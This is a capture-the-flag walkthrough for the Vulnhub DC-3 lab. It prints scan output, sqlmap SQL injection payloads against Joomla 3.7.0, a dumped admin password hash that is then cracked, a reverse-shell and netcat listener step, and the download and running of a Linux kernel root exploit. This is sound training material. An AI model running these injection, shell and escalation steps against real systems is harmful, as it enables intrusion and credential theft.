# DC 3: Vulnhub Walkthrough
**DESCRIPTION**: *DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.*

*Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools. For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward. For those with experience doing CTF and Boot2Root challenges, this probably won't take you long at all (in fact, it could take you less than 20 minutes easily). If that's the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.*

## Scanning

nmap 192.168.122.186

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled.png)

nmap -sV -A --script vuln  192.168.122.186

```jsx
root@kali:~# nmap -sV -A --script vuln  192.168.122.186
Starting Nmap 7.80SVN ( https://nmap.org ) at 2021-05-29 01:22 EDT
Nmap scan report for 192.168.122.186
Host is up (0.013s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.122.186
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.122.186:80/
|     Form id: login-form
|     Form action: /index.php
|     
|     Path: http://192.168.122.186:80/index.php/component/users/?view=reset&amp;Itemid=101
|     Form id: user-registration
|     Form action: /index.php/component/users/?task=reset.request&Itemid=101
|     
|     Path: http://192.168.122.186:80/index.php/component/users/?view=reset&amp;Itemid=101
|     Form id: login-form
|     Form action: /index.php/component/users/?Itemid=101
|     
|     Path: http://192.168.122.186:80/index.php
|     Form id: login-form
|     Form action: /index.php
|     
|     Path: http://192.168.122.186:80/index.php/component/users/?view=remind&amp;Itemid=101
|     Form id: user-registration
|     Form action: /index.php/component/users/?task=remind.remind&Itemid=101
|     
|     Path: http://192.168.122.186:80/index.php/component/users/?view=remind&amp;Itemid=101
|     Form id: login-form
|     Form action: /index.php/component/users/?Itemid=101
|     
|     Path: http://192.168.122.186:80/index.php/2-uncategorised/1-welcome
|     Form id: login-form
|_    Form action: /index.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0
|   /language/en-GB/en-GB.xml: Joomla version 3.7.0
|   /htaccess.txt: Joomla!
|   /README.txt: Interesting, a readme.
|   /bin/: Potentially interesting folder
|   /cache/: Potentially interesting folder
|   /images/: Potentially interesting folder
|   /includes/: Potentially interesting folder
|   /libraries/: Potentially interesting folder
|   /modules/: Potentially interesting folder
|   /templates/: Potentially interesting folder
|_  /tmp/: Potentially interesting folder
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.122.186:80/media/jui/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.122.186:80/media/jui/js/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.122.186:80/media/jui/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|_    http://192.168.122.186:80/media/jui/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2017-8917: 
|   VULNERABLE:
|   **Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability**
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-8917
|     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
|       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
|       to execute aribitrary SQL commands via unspecified vectors.
|       
|     Disclosure date: 2017-05-17
|     Extra information:
|       User: root@localhost
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917
|_      https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|     	CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679
|     	CVE-2017-7668	7.5	https://vulners.com/cve/CVE-2017-7668
|     	CVE-2017-3169	7.5	https://vulners.com/cve/CVE-2017-3169
|     	CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	*EXPLOIT*
|     	EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
|     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
|     	1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502*EXPLOIT*
|     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
|     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
|     	CVE-2019-10082	6.4	https://vulners.com/cve/CVE-2019-10082
|     	CVE-2017-9788	6.4	https://vulners.com/cve/CVE-2017-9788
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	*EXPLOIT*
|     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
|     	EDB-ID:47689	5.8	https://vulners.com/exploitdb/EDB-ID:47689	*EXPLOIT*
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577*EXPLOIT*
|     	CVE-2016-5387	5.1	https://vulners.com/cve/CVE-2016-5387
|     	SSV:96537	5.0	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	*EXPLOIT*
|     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
|     	EXPLOITPACK:2666FB0676B4B582D689921651A30355	5.0	https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355	*EXPLOIT*
|     	EDB-ID:40909	5.0	https://vulners.com/exploitdb/EDB-ID:40909	*EXPLOIT*
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
|     	CVE-2019-0196	5.0	https://vulners.com/cve/CVE-2019-0196
|     	CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199
|     	CVE-2018-17189	5.0	https://vulners.com/cve/CVE-2018-17189
|     	CVE-2018-1333	5.0	https://vulners.com/cve/CVE-2018-1333
|     	CVE-2018-1303	5.0	https://vulners.com/cve/CVE-2018-1303
|     	CVE-2017-9798	5.0	https://vulners.com/cve/CVE-2017-9798
|     	CVE-2017-15710	5.0	https://vulners.com/cve/CVE-2017-15710
|     	CVE-2016-8743	5.0	https://vulners.com/cve/CVE-2016-8743
|     	CVE-2016-8740	5.0	https://vulners.com/cve/CVE-2016-8740
|     	CVE-2016-4979	5.0	https://vulners.com/cve/CVE-2016-4979
|     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	4.9	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	*EXPLOIT*
|     	CVE-2019-0197	4.9	https://vulners.com/cve/CVE-2019-0197
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	*EXPLOIT*
|     	EDB-ID:47688	4.3	https://vulners.com/exploitdb/EDB-ID:47688	*EXPLOIT*
|     	CVE-2020-11985	4.3	https://vulners.com/cve/CVE-2020-11985
|     	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
|     	CVE-2018-1302	4.3	https://vulners.com/cve/CVE-2018-1302
|     	CVE-2018-1301	4.3	https://vulners.com/cve/CVE-2018-1301
|     	CVE-2018-11763	4.3	https://vulners.com/cve/CVE-2018-11763
|     	CVE-2016-4975	4.3	https://vulners.com/cve/CVE-2016-4975
|     	CVE-2016-1546	4.3	https://vulners.com/cve/CVE-2016-1546
|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575*EXPLOIT*
|     	CVE-2018-1283	3.5	https://vulners.com/cve/CVE-2018-1283
|     	CVE-2016-8612	3.3	https://vulners.com/cve/CVE-2016-8612
|     	PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441	*EXPLOIT*
|     	EDB-ID:46676	0.0	https://vulners.com/exploitdb/EDB-ID:46676	*EXPLOIT*
|     	EDB-ID:42745	0.0	https://vulners.com/exploitdb/EDB-ID:42745	*EXPLOIT*
|     	1337DAY-ID-663	0.0	https://vulners.com/zdt/1337DAY-ID-663	*EXPLOIT*
|     	1337DAY-ID-601	0.0	https://vulners.com/zdt/1337DAY-ID-601	*EXPLOIT*
|     	1337DAY-ID-4533	0.0	https://vulners.com/zdt/1337DAY-ID-4533	*EXPLOIT*
|     	1337DAY-ID-3109	0.0	https://vulners.com/zdt/1337DAY-ID-3109	*EXPLOIT*
|_    	1337DAY-ID-2237	0.0	https://vulners.com/zdt/1337DAY-ID-2237	*EXPLOIT*
MAC Address: 00:0C:29:97:DD:11 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT      ADDRESS
1   13.07 ms 192.168.122.186

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanne
```

nikto -h http://192.168.122.186

```jsx
root@kali:~# nikto -h http://192.168.122.186
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.122.186
+ Target Hostname:    192.168.122.186
+ Target Port:        80
+ Start Time:         2021-05-29 01:25:00 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server leaks inodes via ETags, header found with file /bin/, fields: 0x1f 0x54dfee2e147c0 
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/images/".
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-8193: /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
+ OSVDB-3092: /administrator/: This might be interesting...
+ OSVDB-3092: /bin/: This might be interesting...
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3092: /tmp/: This might be interesting...
+ OSVDB-3092: /bin/: This might be interesting... possibly a system shell found.
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
+ /administrator/index.php: Admin login page/section found.
+ 8347 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2021-05-29 01:25:36 (GMT-4) (36 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

      *********************************************************************
      Portions of the server's headers (Apache/2.4.18) are not in
      the Nikto database or are newe
```

## Enumeration

***Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability***

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%201.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%201.png)

*Using sqlmap to exploit above joomle sql injection vulnerability*

```jsx
root@kali:~# **sqlmap -u "http://192.168.122.186/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=update.xml"-p list[fullordering] --dbs --batch**
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.6#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:04:26 /2021-05-29/

[02:04:26] [INFO] resuming back-end DBMS 'mysql' 
[02:04:26] [INFO] testing connection to the target URL
[02:04:26] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('460ada11b31d3c5e5ca6e58fd5d3de27=dc1set4n2o0...m2ii7h32k0'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(5655,CONCAT(0x2e,0x7171716a71,(SELECT (ELT(5655=5655,1))),0x71627a7a71),1990))

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 5736 FROM (SELECT(SLEEP(5)))epcn)
---
[02:04:26] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1
[02:04:26] [INFO] fetching database names
[02:04:26] [INFO] resumed: 'information_schema'
[02:04:26] [INFO] resumed: 'joomladb'
[02:04:26] [INFO] resumed: 'mysql'
[02:04:26] [INFO] resumed: 'performance_schema'
[02:04:26] [INFO] resumed: 'sys'
available databases [5]:
[*] information_schema
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys

[02:04:26] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times
[02:04:26] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.122.186'
[02:04:26] [WARNING] you haven't updated sqlmap for more than 362 days!!!

[*] ending @ 02:04:26 /2021-05-29/

root@kali:~# **sqlmap -u "http://192.168.122.186/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=update.xml"-p list[fullordering] -D joomladb --tables --batch**
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.6#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:17:20 /2021-05-29/

[02:17:21] [INFO] resuming back-end DBMS 'mysql' 
[02:17:21] [INFO] testing connection to the target URL
[02:17:21] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('460ada11b31d3c5e5ca6e58fd5d3de27=2bq6b9npdoa...srp7nc9g05'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(5655,CONCAT(0x2e,0x7171716a71,(SELECT (ELT(5655=5655,1))),0x71627a7a71),1990))

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 5736 FROM (SELECT(SLEEP(5)))epcn)
---
[02:17:21] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1
[02:17:21] [INFO] fetching tables for database: 'joomladb'
Database: joomladb
[76 tables]
+---------------------+
| #__assets           |
| #__associations     |
| #__banner_clients   |
| #__banner_tracks    |
| #__banners          |
| #__bsms_admin       |
| #__bsms_books       |
| #__bsms_comments    |
| #__bsms_locations   |
| #__bsms_mediafiles  |
| #__bsms_message_typ |
| #__bsms_podcast     |
| #__bsms_series      |
| #__bsms_servers     |
| #__bsms_studies     |
| #__bsms_studytopics |
| #__bsms_teachers    |
| #__bsms_templatecod |
| #__bsms_templates   |
| #__bsms_timeset     |
| #__bsms_topics      |
| #__bsms_update      |
| #__categories       |
| #__contact_details  |
| #__content_frontpag |
| #__content_rating   |
| #__content_types    |
| #__content          |
| #__contentitem_tag_ |
| #__core_log_searche |
| #__extensions       |
| #__fields_categorie |
| #__fields_groups    |
| #__fields_values    |
| #__fields           |
| #__finder_filters   |
| #__finder_links_ter |
| #__finder_links     |
| #__finder_taxonomy_ |
| #__finder_taxonomy  |
| #__finder_terms_com |
| #__finder_terms     |
| #__finder_tokens_ag |
| #__finder_tokens    |
| #__finder_types     |
| #__jbsbackup_timese |
| #__jbspodcast_times |
| #__languages        |
| #__menu_types       |
| #__menu             |
| #__messages_cfg     |
| #__messages         |
| #__modules_menu     |
| #__modules          |
| #__newsfeeds        |
| #__overrider        |
| #__postinstall_mess |
| #__redirect_links   |
| #__schemas          |
| #__session          |
| #__tags             |
| #__template_styles  |
| #__ucm_base         |
| #__ucm_content      |
| #__ucm_history      |
| #__update_sites_ext |
| #__update_sites     |
| #__updates          |
| #__user_keys        |
| #__user_notes       |
| #__user_profiles    |
| #__user_usergroup_m |
| #__usergroups       |
| #__users            |
| #__utf8_conversion  |
| #__viewlevels       |
+---------------------+

[02:17:21] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times
[02:17:21] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.122.186'
[02:17:21] [WARNING] you haven't updated sqlmap for more than 362 days!!!

[*] ending @ 02:17:21 /2021-05-29/

root@kali:~# **sqlmap -u "http://192.168.122.186/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=update.xml"-p list[fullordering] -D joomladb -T '#__users' --columns**
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:17:40 /2021-05-29/

[02:17:40] [INFO] resuming back-end DBMS 'mysql' 
[02:17:40] [INFO] testing connection to the target URL
[02:17:41] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('460ada11b31d3c5e5ca6e58fd5d3de27=t9me8puup77...k8usmk35a3'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(5655,CONCAT(0x2e,0x7171716a71,(SELECT (ELT(5655=5655,1))),0x71627a7a71),1990))

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 5736 FROM (SELECT(SLEEP(5)))epcn)
---
[02:17:43] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1
[02:17:43] [INFO] fetching columns for table '#__users' in database 'joomladb'
[02:17:43] [WARNING] unable to retrieve column names for table '#__users' in database 'joomladb'
do you want to use common column existence check? [y/N/q] y
[02:17:46] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
[2] custom
> 1
[02:17:51] [INFO] checking column existence using items from '/usr/share/sqlmap/data/txt/common-columns.txt'
[02:17:51] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 

[02:17:54] [WARNING] running in a single-thread mode. This could take a while
[02:17:53] [INFO] retrieved: id                                                                                                               
[02:17:54] [INFO] retrieved: name                                                                                                             
[02:17:54] [INFO] retrieved: username                                                                                                         
[02:17:54] [INFO] retrieved: email                                                                                                            
[02:17:59] [INFO] retrieved: password                                                                                                         
[02:18:52] [INFO] retrieved: params                                                                                                           
                                                                                                                                              
Database: joomladb
Table: #__users
[6 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | numeric     |
| name     | non-numeric |
| password | non-numeric |
| email    | non-numeric |
| params   | non-numeric |
| username | non-numeric |
+----------+-------------+

[02:19:08] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2637 times
[02:19:08] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.122.186'
[02:19:08] [WARNING] you haven't updated sqlmap for more than 362 days!!!

[*] ending @ 02:19:08 /2021-05-29/

root@kali:~# **sqlmap -u "http://192.168.122.186/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=update.xml"-p list[fullordering] -D joomladb -T '#__users' -C id,username,password --dump**
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.6#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:20:00 /2021-05-29/

[02:20:01] [INFO] resuming back-end DBMS 'mysql' 
[02:20:01] [INFO] testing connection to the target URL
[02:20:01] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('460ada11b31d3c5e5ca6e58fd5d3de27=c58fg7qsgap...985gcqei64'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(5655,CONCAT(0x2e,0x7171716a71,(SELECT (ELT(5655=5655,1))),0x71627a7a71),1990))

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 5736 FROM (SELECT(SLEEP(5)))epcn)
---
[02:20:03] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1
[02:20:03] [INFO] fetching entries of column(s) '`id`, `password`, username' for table '#__users' in database 'joomladb'
[02:20:03] [INFO] retrieved: '629'
[02:20:03] [INFO] retrieved: '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'
[02:20:03] [INFO] retrieved: 'admin'
Database: joomladb
Table: #__users
[1 entry]
+------+--------------------------------------------------------------+----------+
| id   | password                                                     | username |
+------+--------------------------------------------------------------+----------+
| 629  | **$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu** | admin    |
+------+--------------------------------------------------------------+----------+

[02:20:03] [INFO] table 'joomladb.`#__users`' dumped to CSV file '/root/.sqlmap/output/192.168.122.186/dump/joomladb/#__users.csv'
[02:20:03] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 7 times
[02:20:03] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.122.186'
[02:20:03] [WARNING] you haven't updated sqlmap for more than 362 days!!!

[*] ending @ 02:20:03 /2021-05-29/

root@kali:~#
```

*Found password in hash form **$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu*** 

*Now using john to crack the password*

cat > hash

***$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu***

cat hash

john hash ****

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%202.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%202.png)

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%203.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%203.png)

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%204.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%204.png)

*Password found snoopy*

### Exploitation

*Login with admin:snoopy* 

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%205.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%205.png)

*Go to template protostar*

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%206.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%206.png)

*create file with name shell and filetype php*

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%207.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%207.png)

*Then edit shell.php and put reverse shell script in it. Save file and access /templates/protostar/shell.php*

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%208.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%208.png)

*start listening on port 1234*

**nc -nlvp 1234**

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%209.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%209.png)

### Privilege escalation

**uname -a**

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2010.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2010.png)

linux 4.4.0 exploit is available on exploit-db

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2011.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2011.png)

*Download exploit in attacker machine*

wget [https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip)

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2012.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2012.png)

ls

unzip 39772.zip

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2013.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2013.png)

ls

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2014.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2014.png)

cd 39772

ls

tar -xvf exploit.tar

ls

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2015.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2015.png)

cd ebpf_mapfd_doubleput_exploit

ls

./compile.sh

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2016.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2016.png)

./doubleput

id

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2017.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2017.png)

*Got root shell.*

cd /root 

ls

cat the-flag.txt

![DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2018.png](DC-3%2014b1155f74fb46a08121a9a9500e8df1/Untitled%2018.png)
